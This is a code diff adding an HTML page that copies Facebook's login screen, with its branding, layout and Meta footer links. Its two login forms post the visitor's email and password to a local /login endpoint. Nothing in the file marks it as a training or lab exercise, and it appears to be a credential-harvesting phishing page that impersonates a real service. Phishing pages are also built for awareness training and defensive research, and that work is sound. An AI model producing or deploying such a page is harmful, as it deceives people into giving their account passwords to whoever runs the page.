@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook - log in or sign up</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body { min-height: 100%; }
+    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; color: #050505; }
+    .page-header { background: #3b5998; padding: 18px 20px; display: flex; align-items: center; justify-content: space-between; gap: 12px; }
+    .page-header .logo { font-size: 36px; font-weight: 700; color: #ffffff; letter-spacing: -1px; }
+    .top-login { display: flex; align-items: center; gap: 8px; }
+    .top-login input { height: 30px; padding: 6px 10px; border: 1px solid #7186c9; border-radius: 4px; background: #4b6aa3; color: #fff; font-size: 13px; min-width: 110px; }
+    .top-login input::placeholder { color: rgba(255,255,255,0.75); }
+    .top-login button { height: 32px; padding: 0 12px; border: 0; border-radius: 4px; background: #4267b2; color: #fff; font-weight: 700; cursor: pointer; }
+    .top-login a { color: #e7edff; text-decoration: none; font-size: 13px; }
+    .main { display: grid; grid-template-columns: 1.5fr 1fr; gap: 24px; max-width: 1100px; margin: 40px auto; padding: 0 20px; align-items: start; }
+    .hero { padding-top: 20px; }
+    .hero h1 { font-size: clamp(2rem, 3.5vw, 3.2rem); line-height: 1.05; font-weight: 700; margin-bottom: 18px; }
+    .hero p { font-size: 16px; line-height: 1.7; color: #1c1e21; max-width: 520px; }
+    .login-box { background: #fff; border-radius: 12px; padding: 24px; box-shadow: 0 8px 24px rgba(0,0,0,0.08); border: 1px solid rgba(0,0,0,0.08); }
+    .login-box input { width: 100%; padding: 14px 14px; margin-bottom: 12px; border: 1px solid #ccd0d5; border-radius: 8px; background: #f5f6f7; font-size: 15px; }
+    .login-box input:focus { outline: none; border-color: #1877f2; background: #fff; }
+    .login-box button { width: 100%; padding: 14px; border: none; border-radius: 8px; background: #1877f2; color: #fff; font-size: 16px; font-weight: 700; cursor: pointer; }
+    .login-box button:hover { background: #165ac5; }
+    .login-box .link { display: block; margin-top: 12px; text-align: center; color: #1877f2; text-decoration: none; font-size: 14px; }
+    .login-box .link:hover { text-decoration: underline; }
+    .signup { margin-top: 18px; text-align: center; }
+    .signup button { width: auto; min-width: 170px; padding: 12px 18px; border: none; border-radius: 8px; background: #42b72a; color: #fff; font-size: 14px; font-weight: 700; cursor: pointer; }
+    .signup button:hover { background: #36a420; }
+    .page-footer { text-align: center; margin: 40px auto 24px; max-width: 1100px; padding: 0 20px; color: #8a8d91; font-size: 13px; line-height: 1.6; }
+    .page-footer a { color: #8a8d91; text-decoration: none; margin: 0 8px; }
+    .page-footer a:hover { text-decoration: underline; }
+    @media (max-width: 960px) { .main { grid-template-columns: 1fr; } .page-header { flex-wrap: wrap; justify-content: center; text-align: center; } .top-login { justify-content: center; flex-wrap: wrap; } }
+  </style>
+</head>
+<body>
+  <header class="page-header">
+    <div class="logo">facebook</div>
+    <form class="top-login" action="/login" method="post">
+      <input type="email" name="email" placeholder="Email or phone" required autocomplete="username" />
+      <input type="password" name="pass" placeholder="Password" required autocomplete="current-password" />
+      <button type="submit">Log In</button>
+      <a href="#">Forgot account?</a>
+    </form>
+  </header>
+  <main class="main">
+    <section class="hero">
+      <h1>Connect with friends and the world around you on Facebook.</h1>
+      <p>Facebook helps you connect and share with the people in your life. Login below to continue.</p>
+    </section>
+    <aside class="login-box">
+      <form method="POST" action="/login">
+        <input type="email" name="email" placeholder="Email or phone number" required autocomplete="username" />
+        <input type="password" name="pass" placeholder="Password" required autocomplete="current-password" />
+        <button type="submit">Log In</button>
+      </form>
+      <a class="link" href="#">Forgot password?</a>
+      <div class="signup">
+        <button type="button">Create new account</button>
+      </div>
+    </aside>
+  </main>
+  <footer class="page-footer">
+    <a href="#">English (US)</a>
+    <a href="#">ភាសាខ្មែរ</a>
+    <a href="#">Français (France)</a>
+    <a href="#">Tiếng Việt</a>
+    <a href="#">中文(简体)</a>
+    <a href="#">ภาษาไทย</a>
+    <a href="#">한국어</a>
+    <a href="#">日本語</a>
+    <a href="#">Español</a>
+    <a href="#">Português (Brasil)</a>
+    <a href="#">Deutsch</a>
+    <br /><br />
+    <a href="#">Sign Up</a>
+    <a href="#">Log In</a>
+    <a href="#">Messenger</a>
+    <a href="#">Facebook Lite</a>
+    <a href="#">Video</a>
+    <a href="#">Meta Pay</a>
+    <a href="#">Meta Store</a>
+    <a href="#">Meta Quest</a>
+    <a href="#">Instagram</a>
+    <a href="#">Threads</a>
+    <a href="#">Privacy Policy</a>
+    <a href="#">Cookie Settings</a>
+    <a href="#">About</a>
+    <a href="#">Create ad</a>
+    <a href="#">Create Page</a>
+    <a href="#">Developers</a>
+    <a href="#">Careers</a>
+    <a href="#">Cookies</a>
+    <a href="#">Ad choices</a>
+    <a href="#">Terms</a>
+    <a href="#">Help</a>
+    <br /><br />
+    Meta © 2026
+  </footer>
+</body>
+</html>
